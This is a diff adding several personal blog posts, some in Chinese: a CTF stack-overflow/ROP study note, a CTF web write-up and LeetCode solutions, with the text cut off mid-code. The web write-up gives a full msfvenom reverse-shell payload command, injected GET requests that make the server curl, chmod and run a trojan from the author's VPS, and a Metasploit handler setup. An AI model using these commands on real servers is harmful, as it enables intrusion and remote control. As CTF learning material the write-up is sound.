@@ -166,6 +166,483 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://123.57.173.58/2020/09/22/rop%E9%9A%8F%E7%AC%94(1)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Paradox">
+      <meta itemprop="description" content="What I have learned">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paradox's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/22/rop%E9%9A%8F%E7%AC%94(1)/" class="post-title-link" itemprop="url">rop随笔(1)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-09-22 00:00:00" itemprop="dateCreated datePublished" datetime="2020-09-22T00:00:00+08:00">2020-09-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-09-27 10:36:35" itemprop="dateModified" datetime="2020-09-27T10:36:35+08:00">2020-09-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="rop随笔1">rop随笔(1)</h2>
+<h4 id="x0-background">0x0 background</h4>
+<p>昨天做了一天西工大pwn方向的hello world题, 只做出来了两道(一道是大佬给的flag), 深感自己太菜了, 为了顺一顺思路故写篇博客</p>
+<h4 id="x1-appetizer">0x1 appetizer</h4>
+<p>首先记录下昨天做题过程中一些疑惑的小细节:</p>
+<ul>
+<li><p>栈是向下生长的, x86-64架构下是小端法表示, 各种基本类型的指针都是指向栈顶方向, 比如向char类型数组中写数据是从低往高写的(这也是能够进行栈溢出攻击的原理)</p></li>
+<li><p>在进行栈溢出攻击的时候应该要考虑栈随机化和堆随机化, 所以不能直接用栈中的绝对地址覆盖返回地址!!! 这个地址不一定有写的权限或者可能覆盖其他一些重要的代码片段从而报segment fault</p></li>
+<li><p>call指令: 把下一条指令的地址压入栈中, 把<code>%rip</code>的值设置为call的operand</p>
+<blockquote>
+<p><code>push %rip</code> -&gt; <code>jmp operand</code></p>
+</blockquote></li>
+<li><p>ret指令: 把当前栈指针指向的地址弹出到<code>%rip</code>中</p>
+<blockquote>
+<p><code>pop %r15</code> -&gt; <code>jmp %r15</code></p>
+</blockquote></li>
+<li><p>gdb调试下环境不完全是真实环境, 比如栈随机化很可能就不会开(昨天在这里卡了很长时间)</p></li>
+<li><p>向栈中传入地址时由于是小端法表示且指针指向最小的地址, 所以要把传入的地址先反序一下</p></li>
+</ul>
+<h4 id="x2-main-course">0x2 main course</h4>
+<p>进行攻击的基本原理是当目标程序进行读操作时, 如果有栈溢出漏洞导致可以读入比在栈中分配缓存更大的字节, 就可以达到覆盖返回地址进行攻击的目的</p>
+<p><strong>WARNING</strong>: 本小节描述方法仅限于没开NX的程序</p>
+<p>具体操作:</p>
+<ol type="1">
+<li>阅读目标elf的objdump, 寻找到一个data或bss段字节恰好能翻译成类似<code>jmp %rsp</code>的片段的地址, 称为gadget</li>
+<li>准备好要执行的payload, 比如<code>execve("/bin/sh",NULL,NULL)</code>来打开shell为所欲为</li>
+<li>payload由占位符+目标地址(覆盖原返回地址)+shellcode组成</li>
+<li>被攻击的subroutine在执行完<code>ret</code>之后就会跳转到目标地址然后再跳转到栈指针的位置向上执行你植入的shellcode</li>
+</ol>
+<h4 id="x3-dessert">0x3 dessert</h4>
+<ul>
+<li>一般对于64位程序, 地址可能会有一些leading 0, 这样如果目标subroutine做的是string-based buffer, 一般就不能直接覆盖</li>
+<li>jmp esp类的攻击比nop sled更加优良, 可以避免因为多次猜地址错误而在服务器端留下大量crush log</li>
+<li>其实这个有很多花活, 比如寻找gadget然后再调用read二次注入shellcode到任意一个rwx段再jmp到二次注入的shellcode执行</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://123.57.173.58/2020/09/20/mfs%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Paradox">
+      <meta itemprop="description" content="What I have learned">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paradox's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/20/mfs%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">mfs攻击</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-09-20 00:00:00" itemprop="dateCreated datePublished" datetime="2020-09-20T00:00:00+08:00">2020-09-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-09-27 10:37:06" itemprop="dateModified" datetime="2020-09-27T10:37:06+08:00">2020-09-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="mfs攻击">mfs攻击</h3>
+<p>经历了两天的时间, 我终于(在学长的帮助下)做出了第一道web题!!! 写个博客纪念且记录一下.</p>
+<h4 id="题目环境">题目环境</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/php|flag|zlib|ftp|phar|data|rar|ogg|expe|http|glob|ssh2|\^|\~|\(|\)|\[|\]|\,|\&lt;|\&gt;|\?|\\\|\[|\]|\=|\+|\;|\:|\&#x27;|\&quot;/i&#x27;</span>, $_GET[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">print</span> $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;include &quot;</span> . $_GET[<span class="string">&#x27;url&#x27;</span>] . <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//flag is in /flag and The format of flag is flag&#123;xxxx&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="分析">分析</h4>
+<ol start="0" type="1">
+<li>最后一行注释告诉我们本题flag存在<code>/flag</code>中</li>
+<li>由第一行的<code>error_reporting(0)</code>和后面的<code>eval()</code>得知本题是无回显的, 所以要寻找代码中漏洞提取服务器权限来查看<code>/flag</code></li>
+<li>通过仔细观察<code>preg_match</code>函数分析得知参数中绝大部分特殊字符都被过滤, 故插入php代码片段的想法是不可行的</li>
+<li>经学长告知, 该题可以使用<strong>msf</strong> 来向服务器中安装后门木马来拿到flag</li>
+</ol>
+<h4 id="工具原料">工具&amp;原料</h4>
+<ol start="0" type="1">
+<li>一个具有公网ip的设备(我用的vps)</li>
+<li>在上述设备上下载安装mfs</li>
+</ol>
+<h4 id="msf使用及具体构造方法">msf使用及具体构造方法</h4>
+<ol start="0" type="1">
+<li><p>首先通过f12-&gt;network可以观察到服务器环境为debian, 故需要准备linux版本的木马</p></li>
+<li><p>通过 <code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;your_vps_ip&gt; LPORT=&lt;port&gt; -f elf &gt; shell.elf</code> 来创建x64 linux下的木马</p>
+<blockquote>
+<p>由于本题过滤了’:’, 故只能通过80端口来使服务器请求该木马, 所以木马上设置的端口不能为80</p>
+</blockquote></li>
+<li><p>向该题环境发送带参数的GET请求:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;addr&gt;/?url=`curl -o /tmp/shell &lt;your_vps_ip&gt;/shell.elf` # let server download your trojan-horse</span><br><span class="line">&lt;addr&gt;/?url=`chmod 777 /tmp/shell` # make it executable</span><br><span class="line">&lt;addr&gt;/?url=`/tmp/shell` # run it!</span><br></pre></td></tr></table></figure></li>
+<li><p>在题目环境服务器上成功安装并执行木马之后就可以在vps上操作服务器了:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msfconsole</span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST &lt;your_vps_ip&gt;</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT &lt;port&gt;</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure></li>
+<li><p>之后就可以直接运行 <code>cat /flag</code> 拿到flag啦!</p></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://123.57.173.58/2020/09/17/35.Search%20Insert%20Position/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Paradox">
+      <meta itemprop="description" content="What I have learned">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paradox's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/17/35.Search%20Insert%20Position/" class="post-title-link" itemprop="url">35.Search Insert Position</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-09-17 00:00:00" itemprop="dateCreated datePublished" datetime="2020-09-17T00:00:00+08:00">2020-09-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-09-27 10:35:17" itemprop="dateModified" datetime="2020-09-27T10:35:17+08:00">2020-09-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/leetcode/" itemprop="url" rel="index"><span itemprop="name">leetcode</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="search-insert-position">35.Search Insert Position</h3>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://leetcode.com/problems/search-insert-position/description/">source link</a></p>
+</blockquote>
+<h5 id="description">Description</h5>
+<p>Given a sorted array and a target value, return the index if the target is found. If not, return the index where it would be if it were inserted in order.</p>
+<p>You may assume no duplicates in the array.</p>
+<h5 id="signature">Signature</h5>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">searchInsert</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span></span>;</span><br></pre></td></tr></table></figure>
+<h5 id="analysis">Analysis</h5>
+<h5 id="solution">Solution</h5>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">searchInsert</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>, high;</span><br><span class="line">        <span class="keyword">if</span> ((high = nums.size()) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (low + <span class="number">1</span> &lt; high) &#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (low + high - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[low] &lt; target ? low + <span class="number">1</span> : low;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://123.57.173.58/2020/09/17/39.Combination%20Sum/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Paradox">
+      <meta itemprop="description" content="What I have learned">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paradox's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/17/39.Combination%20Sum/" class="post-title-link" itemprop="url">39.Combination Sum</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-09-17 00:00:00" itemprop="dateCreated datePublished" datetime="2020-09-17T00:00:00+08:00">2020-09-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-09-27 10:35:17" itemprop="dateModified" datetime="2020-09-27T10:35:17+08:00">2020-09-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/leetcode/" itemprop="url" rel="index"><span itemprop="name">leetcode</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="combination-sum">39.Combination Sum</h3>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://leetcode.com/problems/39.Combination%20Sum">source link</a></p>
+</blockquote>
+<h5 id="description">Description</h5>
+<p>Given a set of candidate numbers (candidates) (without duplicates) and a target number (target), find all unique combinations in candidates where the candidate numbers sums to target.</p>
+<p>The same repeated number may be chosen from candidates unlimited number of times.</p>
+<h5 id="signature">Signature</h5>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">combinationSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target)</span></span>;</span><br></pre></td></tr></table></figure>
+<h5 id="analysis">Analysis</h5>
+<p>Simplely use the backtracing algorithm.</p>
+<h5 id="solution">Solution</h5>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="built_in">list</span>, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; r, <span class="keyword">int</span> begin, <span class="keyword">int</span> target, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = begin; i &lt; <span class="built_in">list</span>.size(); i++) &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;i:%d target:%d path:&quot;, i, target);</span></span><br><span class="line">            <span class="comment">// for (auto e : path) &#123;</span></span><br><span class="line">            <span class="comment">//     printf(&quot;%d &quot;, e);</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            <span class="comment">// printf(&quot;\n&quot;);</span></span><br><span class="line">            <span class="keyword">int</span> chd_target = target - <span class="built_in">list</span>[i];</span><br><span class="line">            <span class="keyword">if</span> (chd_target == <span class="number">0</span>) &#123;</span><br><span class="line">                path.push_back(<span class="built_in">list</span>[i]);</span><br><span class="line">                r.push_back(path);</span><br><span class="line">                path.pop_back();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (chd_target &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                path.push_back(<span class="built_in">list</span>[i]);</span><br><span class="line">                dfs(<span class="built_in">list</span>, r, i, chd_target, path);</span><br><span class="line">                path.pop_back();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">combinationSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; r;</span><br><span class="line">        sort(candidates.begin(), candidates.end());</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">        dfs(candidates, r, <span class="number">0</span>, target, path);</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://123.57.173.58/2020/09/16/34.Find%20First%20and%20Last%20Position%20of%20Element%20in%20Sorted%20Array/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Paradox">
+      <meta itemprop="description" content="What I have learned">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paradox's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/16/34.Find%20First%20and%20Last%20Position%20of%20Element%20in%20Sorted%20Array/" class="post-title-link" itemprop="url">34.Find First and Last Position of Element in Sorted Array</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-09-16 00:00:00" itemprop="dateCreated datePublished" datetime="2020-09-16T00:00:00+08:00">2020-09-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-09-27 10:35:17" itemprop="dateModified" datetime="2020-09-27T10:35:17+08:00">2020-09-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/leetcode/" itemprop="url" rel="index"><span itemprop="name">leetcode</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="find-first-and-last-position-of-element-in-sorted-array">34.Find First and Last Position of Element in Sorted Array</h3>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://leetcode.com/problems/find-first-and-last-position-of-element-in-sorted-array/description/">source link</a></p>
+</blockquote>
+<h5 id="description">Description</h5>
+<p>Given an array of integers nums sorted in ascending order, find the starting and ending position of a given target value.</p>
+<p>Your algorithm's runtime complexity must be in the order of O(log n).</p>
+<p>If the target is not found in the array, return [-1, -1].</p>
+<h5 id="signature">Signature</h5>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">searchRange</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span></span>;</span><br></pre></td></tr></table></figure>
+<h5 id="analysis">Analysis</h5>
+<p>To solve the problems in the order of O(log n), just use the binary search until search failed.</p>
+<p><strong>DON’T FORGET THE EMPTY CASE!!</strong></p>
+<h5 id="solution">Solution</h5>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int biSearch(vector&lt;int&gt;&amp; nums, int low, int high, int target) &#123;</span><br><span class="line">        <span class="keyword">while</span> (low + <span class="number">1</span> &lt; high) &#123;</span><br><span class="line">            int mid = (low + high - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        // cout &lt;&lt; &quot;biS r: &quot; &lt;&lt; (nums[low] == target ? low : -1) &lt;&lt; endl;</span><br><span class="line">        return nums[low] == target ? low : -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vector&lt;int&gt; searchRange(vector&lt;int&gt;&amp; nums, int target) &#123;</span><br><span class="line">        vector&lt;int&gt; v;</span><br><span class="line">        <span class="keyword">if</span> (nums.size() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            v.push_back(<span class="number">-1</span>);</span><br><span class="line">            v.push_back(<span class="number">-1</span>);</span><br><span class="line">            <span class="keyword">return</span> v;</span><br><span class="line">        &#125;</span><br><span class="line">        int low = biSearch(nums, <span class="number">0</span>, nums.size(), target);</span><br><span class="line">        <span class="keyword">if</span> (low == <span class="number">-1</span>) &#123;</span><br><span class="line">            v.push_back(<span class="number">-1</span>);</span><br><span class="line">            v.push_back(<span class="number">-1</span>);</span><br><span class="line">            <span class="keyword">return</span> v;</span><br><span class="line">        &#125;</span><br><span class="line">        int high = low;</span><br><span class="line">        int r1, r2;</span><br><span class="line">        <span class="keyword">while</span> (true) &#123;</span><br><span class="line">            <span class="keyword">if</span> (low &gt; <span class="number">0</span> &amp;&amp; (r1 = biSearch(nums, <span class="number">0</span>, low, target)) != <span class="number">-1</span>) &#123;</span><br><span class="line">                low = r1;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (high &lt; nums.size() - <span class="number">1</span> &amp;&amp; (r2 = biSearch(nums, high + <span class="number">1</span>, nums.size(), target)) != <span class="number">-1</span>) &#123;</span><br><span class="line">                high = r2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((low == <span class="number">0</span> || r1 == <span class="number">-1</span>) &amp;&amp; (high == nums.size() - <span class="number">1</span> || r2 == <span class="number">-1</span>)) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v.push_back(low);</span><br><span class="line">        v.push_back(high);</span><br><span class="line">        <span 